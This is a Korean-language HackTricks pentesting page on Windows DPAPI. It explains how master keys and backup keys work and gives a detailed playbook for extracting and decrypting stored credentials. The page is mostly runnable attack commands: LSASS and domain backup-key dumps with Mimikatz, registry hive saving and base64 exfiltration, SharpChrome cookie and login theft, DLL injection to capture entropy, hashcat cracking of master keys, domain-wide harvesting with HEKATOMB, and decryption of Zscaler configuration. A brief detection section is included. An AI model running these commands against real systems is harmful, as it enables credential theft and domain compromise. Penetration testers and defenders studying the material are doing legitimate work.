# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란

Data Protection API(DPAPI)는 Windows 운영 체제에서 주로 **비대칭 개인 키를 대칭 암호화**하는 데 사용되며, 사용자 또는 시스템의 비밀 정보를 중요한 엔트로피 소스로 활용합니다. 이 방식은 사용자의 로그온 비밀 정보나 시스템의 도메인 인증 비밀 정보에서 파생된 키로 데이터를 암호화할 수 있게 해 개발자의 암호화를 단순화하고, 암호화 키를 직접 보호해야 하는 부담을 덜어 줍니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `CryptUnprotectData`** 함수를 사용하는 것입니다. 이 함수는 현재 로그온한 프로세스의 보안 컨텍스트를 사용해 데이터를 암호화하고 복호화합니다. 기본적으로 데이터는 암호화에 사용된 것과 동일한 사용자 또는 시스템 컨텍스트에서만 복호화할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

이 함수들은 암호화와 복호화에 사용되는 선택적 **엔트로피 매개변수**도 받습니다. 선택적 엔트로피로 보호된 데이터를 복호화하려면 동일한 엔트로피 값이 필요합니다.<sup>[[2]](#references)[[6]](#references)</sup>

### 사용자 키 생성

DPAPI는 사용자의 자격 증명에서 사용자별 값(흔히 **pre-key**라고 함)을 파생합니다. 정확한 파생 방식은 계정과 운영 체제 버전에 따라 다릅니다. 예를 들어 Impacket은 UTF-16LE 비밀번호의 SHA-1 다이제스트를 기반으로 하는 HMAC-SHA1 방식, 비밀번호의 MD4/NT hash를 기반으로 하는 또 다른 방식, 그리고 Protected Users를 위한 PBKDF2-SHA256 파생 방식을 시도합니다. 따라서 오프라인 도구는 평문 비밀번호나 사용 가능한 NT hash 중 하나로 필요한 자료를 파생할 수 있는 경우가 많습니다.<sup>[[2]](#references)[[10]](#references)</sup>

이는 공격자가 사용자의 비밀번호 hash를 얻을 수 있는 경우 다음을 수행할 수 있다는 점에서 특히 중요합니다.

- 해당 사용자의 키로 **DPAPI를 사용해 암호화된 모든 데이터**를 API에 접속하지 않고 복호화
- 유효한 DPAPI 키를 생성하기 위해 오프라인에서 **비밀번호 크래킹** 시도

DPAPI는 보호된 blob마다 새 master key를 만들지 않고, 사용자마다 하나 이상의 **master key**를 유지합니다. 각 master key에는 **GUID**(Globally Unique Identifier)가 있으며, 암호화된 blob에는 해당 blob을 보호하는 master key가 기록되어 있습니다.<sup>[[2]](#references)</sup>

Master key는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 Security Identifier입니다. Master key 파일에는 사용자의 **pre-key**로 보호되는 자료와, 도메인 사용자의 경우 **domain backup key**로 보호되는 복구 자료가 포함됩니다.<sup>[[2]](#references)</sup>

**Master key를 암호화하는 데 사용되는 도메인 키는 도메인 컨트롤러에 저장되며 변경되지 않습니다.** 따라서 공격자가 도메인 컨트롤러에 접근할 수 있다면 domain backup key를 가져와 도메인의 모든 사용자에 대한 master key를 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

암호화된 blob의 헤더에는 내부 데이터를 암호화하는 데 사용된 **master key의 GUID**가 포함됩니다.

> [!TIP]
> DPAPI로 암호화된 blob은 **`01 00 00 00`**으로 시작합니다.

Master key 찾기:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys of a user will look like:

![What is DPAPI - Users key generation: This is what a bunch of Master Keys of a user will look like](<../../images/image (1121).png>)

### Machine/System key 생성

이 키는 machine이 데이터를 암호화하는 데 사용됩니다. **DPAPI_SYSTEM LSA secret**을 기반으로 하며, SYSTEM 사용자만 액세스할 수 있는 특수 키입니다. 이 키는 machine 수준의 자격 증명이나 시스템 전체에서 사용하는 secret처럼 시스템 자체에서 액세스해야 하는 데이터를 암호화하는 데 사용됩니다.<sup>[[2]](#references)</sup>

이 키에는 **domain backup이 없으므로** 로컬에서만 액세스할 수 있습니다:

- **Mimikatz**는 다음 명령으로 LSA secrets를 dump하여 이 키에 액세스할 수 있습니다: `mimikatz lsadump::secrets`
- secret은 registry에 저장되므로, 관리자는 **DACL permissions를 수정하여 액세스할 수 있습니다**. registry 경로는 다음과 같습니다: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives에서 오프라인으로 추출하는 방법도 있습니다. 예를 들어, target에서 관리자로 hives를 저장한 다음 exfiltrate합니다:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

그런 다음 분석용 머신에서 하이브로부터 DPAPI_SYSTEM LSA secret을 복구하고, 이를 사용해 machine-scope DPAPI blob을 복호화합니다(예: 머신 보호 애플리케이션 자격 증명 또는 Wi-Fi 프로필):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam 관련 DPAPI 예시:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI로 보호되는 데이터

DPAPI로 보호되는 개인 데이터는 다음과 같습니다.

- Windows 자격 증명
- Internet Explorer 및 Google Chrome의 비밀번호와 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호와 암호화 키
- 원격 데스크톱 연결, .NET Passport 및 다양한 암호화와 인증 용도의 개인 키에 대한 비밀번호
- Credential Manager에서 관리하는 네트워크 비밀번호와 Skype, MSN messenger 등 CryptProtectData를 사용하는 애플리케이션의 개인 데이터
- 레지스트리 내 암호화된 blob
- ...

시스템 보호 데이터에는 다음이 포함됩니다.
- Wi-Fi 비밀번호
- ...

예약된 작업 비밀번호는 별도의 LSA-secret 문제입니다. [Password 로그온 유형](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type)으로 등록된 작업은 로컬 관리자/SYSTEM 복구를 위해 비밀번호를 저장할 수 있습니다. S4U 또는 대화형 토큰 작업은 비밀번호가 저장되었음을 의미하지 않습니다. 작업의 주체와 로그온 유형은 실행 계정 이름만 보는 것보다 더 확실한 지표입니다.

### Master key 추출 옵션

- 사용자에게 도메인 관리자 권한이 있으면 **도메인 백업 키**에 액세스하여 도메인의 모든 사용자 master key를 복호화할 수 있습니다:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- 로컬 관리자 권한으로 **LSASS 메모리에 액세스**하여 접속한 모든 사용자의 DPAPI master key와 SYSTEM key를 추출할 수 있습니다.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- 사용자에게 로컬 관리자 권한이 있으면 **DPAPI_SYSTEM LSA secret**에 접근해 시스템 마스터 키를 복호화할 수 있습니다:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- 사용자의 password 또는 NTLM hash를 알고 있다면 **사용자의 master keys를 직접 decrypt할 수 있습니다**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- 사용자로 세션에 로그인한 상태라면 **RPC를 사용해 마스터 키를 복호화할 백업 키를 DC에 요청**할 수 있습니다. 로컬 관리자이고 사용자가 로그인한 상태라면 **사용자의 세션 토큰을 탈취**할 수 있습니다:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault 목록

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI 암호화 데이터에 액세스

### DPAPI 암호화 데이터 찾기

일반 사용자의 **보호된 파일**은 다음 위치에 있습니다.

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 바꾼 경로도 확인하세요.

열거 예시:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 blob에서 DPAPI로 암호화된 blob을 찾을 수 있습니다:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

참고로 같은 repo의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)을 사용하면 cookies 같은 민감한 데이터를 DPAPI로 복호화할 수 있습니다.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron 빠른 레시피 (SharpChrome)

- 현재 사용자: 저장된 로그인 정보/cookies를 대화형으로 복호화합니다 (사용자 컨텍스트에서 실행하면 Credential Manager에서 추가 키를 가져오므로 Chrome 127+의 app-bound cookies도 복호화할 수 있습니다):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- 파일만 있는 경우 오프라인 분석. 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음, 이를 사용해 cookie DB를 복호화합니다:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI 도메인 백업 키(PVK)를 보유하고 대상 호스트의 관리자 권한이 있는 경우의 도메인 전체/원격 triage:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- 사용자의 DPAPI prekey/credkey(LSASS에서 획득)가 있다면, password cracking을 건너뛰고 프로필 데이터를 바로 복호화할 수 있습니다:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Notes
- 최신 Chrome/Edge 빌드는 특정 쿠키를 "App-Bound" 암호화로 저장할 수 있습니다. 추가 app-bound key 없이는 해당 쿠키를 오프라인에서 복호화할 수 없습니다. 대상 사용자 컨텍스트에서 SharpChrome을 실행하면 해당 키를 자동으로 가져옵니다. 아래에 참조된 Chrome 보안 블로그 게시물을 확인하세요.<sup>[[5]](#references)</sup>

### Access keys and data

- **SharpDPAPI를 사용해** 현재 세션의 DPAPI 암호화 파일에서 자격 증명을 가져옵니다:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **자격 증명 정보 획득**: 암호화된 데이터와 guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkeys에 접근**:

RPC를 사용해 **domain backup key**를 요청하는 사용자의 masterkey를 복호화합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** 도구는 마스터키 복호화에 다음 인수도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 암호를 지정하거나, `/pvk`를 사용해 DPAPI 도메인 개인 키 파일을 지정할 수 있습니다...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkey를 사용하여 데이터 복호화**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화에 다음 인수도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 암호를 사용하거나, `/pvk`를 사용해 DPAPI 도메인 개인 키 파일을 지정하거나, `/unprotect`를 사용해 현재 사용자의 세션을 사용할 수 있음에 유의하세요...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey를 직접 사용 (password 불필요)

LSASS를 dump할 수 있다면, Mimikatz에서 plaintext password를 몰라도 사용자의 masterkeys를 복호화하는 데 사용할 수 있는 로그온별 DPAPI key를 확인할 수 있는 경우가 많습니다. 이 값을 tooling에 직접 전달하세요:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화합니다:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py를 이용한 오프라인 복호화

피해 사용자 계정의 SID와 비밀번호(또는 NT hash)가 있으면 Impacket의 dpapi.py를 사용해 DPAPI masterkey와 Credential Manager blob을 완전히 오프라인에서 복호화할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

- 디스크에서 아티팩트 식별:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - 해당 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 파일 전송 도구가 불안정하다면, 호스트에서 파일을 base64로 인코딩한 뒤 출력을 복사합니다:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- 사용자의 SID와 비밀번호/해시를 사용해 masterkey를 복호화합니다:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- 복호화된 masterkey를 사용해 credential blob을 복호화합니다:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

이 workflow는 Windows Credential Manager를 사용하는 앱에 저장된 도메인 자격 증명(관리자 계정 포함, 예: `*_adm`)을 복구하는 경우가 많습니다.

---

### 선택적 엔트로피 처리("Third-party entropy")

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 복호화할 수 없습니다. 따라서 이러한 방식으로 보호된 자격 증명을 대상으로 할 때는 entropy를 확보하는 것이 필수적입니다(예: Microsoft Outlook, 일부 VPN 클라이언트).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)(2022)는 대상 프로세스 내부의 DPAPI 함수를 hook하고 전달된 선택적 entropy를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe`나 `vpnclient.exe` 같은 프로세스를 대상으로 **DLL-injection** 모드에서 EntropyCapture를 실행하면 각 entropy 버퍼를 호출 프로세스 및 blob에 연결하는 파일이 출력됩니다. 캡처한 entropy는 나중에 **SharpDPAPI**(`/entropy:`) 또는 **Mimikatz**(`/entropy:<file>`)에 전달하여 데이터를 복호화할 수 있습니다.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Masterkey 오프라인 크래킹 (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** masterkey 형식을 도입했습니다. `hashcat` v6.2.6 (2023년 12월)은 hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1), **22102** (context 3)을 추가해 masterkey 파일에서 사용자 비밀번호를 직접 GPU 가속으로 크래킹할 수 있게 했습니다. 따라서 공격자는 대상 시스템과 상호작용하지 않고 word-list 또는 brute-force 공격을 수행할 수 있습니다.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024)은 이 과정을 자동화합니다:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

이 도구는 Credential 및 Vault blob도 파싱하고, 크랙한 키로 복호화한 뒤 평문 비밀번호를 내보낼 수 있습니다.<sup>[[8]](#references)</sup>


### 다른 머신의 데이터에 접근하기

**SharpDPAPI 및 SharpChrome**에서는 **`/server:HOST`** 옵션을 지정해 원격 머신의 데이터에 접근할 수 있습니다. 물론 해당 머신에 접근할 수 있어야 하며, 다음 예제에서는 **도메인 백업 암호화 키를 알고 있다고 가정합니다**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### SSRS report-server 데이터베이스 연결

SQL Server Reporting Services (SSRS) 호스트에서 `RSReportServer.config`에는 report-server 데이터베이스용 암호화된 `<Dsn>`이 들어 있을 수 있습니다.<sup>[[15]](#references)</sup> SSRS는 이러한 연결 설정을 **로컬 머신 수준 키**로 보호합니다. 외부 report data source의 자격 증명은 대신 대칭 키를 사용해 report-server 데이터베이스에서 암호화됩니다.<sup>[[14]](#references)</sup>

보고된 사례에서 공격자는 `Dsn`을 추출하고, Base64로 디코딩한 바이트를 `ProtectedData.Unprotect`와 `LocalMachine` 범위로 복호화하려고 했습니다.<sup>[[13]](#references)</sup>

이를 보호한 머신의 SSRS 구성 파일에 대한 읽기 권한이 있다면 실제 인스턴스 경로를 찾고 값을 확인하세요. 예시 경로는 SSRS 2017 이상 버전용입니다. 머신 수준 보호에는 SSRS 서비스 계정 컨텍스트가 필요하지 않습니다.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

빈 `Dsn`이거나 `Dsn`이 없으면 이 방법으로 복호화할 대상이 없습니다.<sup>[[15]](#references)</sup> 복호화된 연결 문자열에 재사용 가능한 암호가 반드시 포함되는 것은 아닙니다. SSRS는 서비스 계정을 사용할 수 있으며, 구성된 도메인 계정에는 별도의 `LogonUser`, `LogonDomain`, `LogonCred` 설정이 있을 수 있습니다.<sup>[[15]](#references)</sup> 암호화된 값만 다른 머신에 복사해도 해당 머신이 원래 호스트의 보호 키를 얻는 것은 아닙니다.<sup>[[14]](#references)</sup>

그 밖의 SQL Server 접근 경로는 [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)을 참조하세요.

## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉터리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 과정을 자동화하는 도구입니다. 그런 다음 스크립트는 모든 컴퓨터의 IP 주소를 확인하고 각 컴퓨터에서 smbclient를 실행해 모든 사용자의 DPAPI blob을 가져온 뒤, 도메인 백업 키로 모두 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록을 이용하면 네트워크를 몰랐더라도 모든 서브넷을 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호되는 비밀 정보를 자동으로 덤프할 수 있습니다. 2.x 릴리스에는 다음 기능이 추가되었습니다.<sup>[[9]](#references)</sup>

* 수백 개 호스트에서 blob을 병렬로 수집
* **context 3** masterkey 파싱 및 Hashcat 크래킹 자동 통합
* Chrome "App-Bound" 암호화 쿠키 지원(다음 섹션 참조)
* 새 **`--snapshot`** 모드로 엔드포인트를 반복적으로 폴링하고 새로 생성된 blob 비교

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)는 masterkey/credential/vault 파일을 파싱해 Hashcat/JtR 형식으로 출력하고, 선택적으로 크래킹을 자동 실행할 수 있는 C# 파서입니다. Windows 11 24H1까지의 머신 및 사용자 masterkey 형식을 완벽하게 지원합니다.<sup>[[8]](#references)</sup>


## 일반적인 탐지 방법

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉터리의 파일에 대한 접근.
    - 특히 **C$** 또는 **ADMIN$**와 같은 네트워크 공유에서의 접근.
- LSASS 메모리에 접근하거나 masterkey를 덤프하기 위한 **Mimikatz**, **SharpDPAPI** 또는 유사 도구의 사용.
- 이벤트 **4662**: *개체에 작업이 수행됨* – **`BCKUPKEY`** 개체에 대한 접근과 연관 지어 분석할 수 있습니다.
- 프로세스가 *SeTrustedCredManAccessPrivilege*를 요청할 때 발생하는 이벤트 **4673/4674**(Credential Manager)

---
### 2023-2025 취약점 및 생태계 변화

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023년 11월). 네트워크 접근 권한이 있는 공격자는 도메인 구성원이 악성 DPAPI 백업 키를 가져오도록 속여 사용자 masterkey를 복호화할 수 있습니다. 2023년 11월 누적 업데이트에서 패치되었습니다. 관리자는 DC와 워크스테이션에 최신 패치가 적용되었는지 확인해야 합니다.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” 쿠키 암호화**(2024년 7월)는 기존 DPAPI 전용 보호를 사용자 **Credential Manager**에 저장되는 추가 키로 대체했습니다. 이제 쿠키를 오프라인에서 복호화하려면 DPAPI masterkey와 **GCM-wrapped app-bound key**가 모두 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트에서 실행될 때 추가 키를 복구할 수 있습니다.<sup>[[5]](#references)</sup>


### 사례 연구: Zscaler Client Connector – SID에서 파생된 사용자 지정 Entropy

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)을 저장합니다. 각 파일은 **DPAPI (Machine scope)**로 암호화되지만, 공급업체는 디스크에 저장하는 대신 *런타임에 계산되는* **사용자 지정 entropy**를 제공합니다.<sup>[[1]](#references)</sup>

Entropy는 다음 두 요소로 재구성됩니다.

1. `ZSACredentialProvider.dll` 내부에 하드코딩된 비밀 값.
2. 구성과 연관된 Windows 계정의 **SID**.

DLL에 구현된 알고리즘은 다음과 동일합니다:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

시크릿은 디스크에서 읽을 수 있는 DLL에 포함되어 있으므로, **SYSTEM 권한을 가진 모든 로컬 공격자는 어떤 SID에 대해서든 entropy를 다시 생성하고 blob을 오프라인에서 복호화할 수 있습니다**:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

복호화하면 모든 **device posture check**와 예상 값이 포함된 전체 JSON 구성이 추출됩니다. 이 정보는 client-side bypasses를 시도할 때 매우 유용합니다.

> 팁: 다른 암호화된 아티팩트(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 entropy 없이 DPAPI로 보호됩니다(`16`개의 0 바이트). 따라서 SYSTEM 권한을 얻으면 `ProtectedData.Unprotect`를 사용해 바로 복호화할 수 있습니다.

## References

- [1] [Synacktiv – zero trust를 신뢰해도 될까? Zscaler posture check 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI의 보안 분석 및 데이터 복구](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz와 C++를 사용해 DPAPI 암호화된 비밀 읽기](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) 스푸핑 취약점](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows에서 Chrome 쿠키 보안 강화](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI 선택적 entropy 간단히 추출하기](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 릴리스 노트](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub 저장소](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI 프로젝트 페이지](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL 악용, KeePassXC Argon2 크래킹, DPAPI 복호화로 DC 관리자 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 사용법 및 옵션](https://github.com/GhostPack/SharpDPAPI)
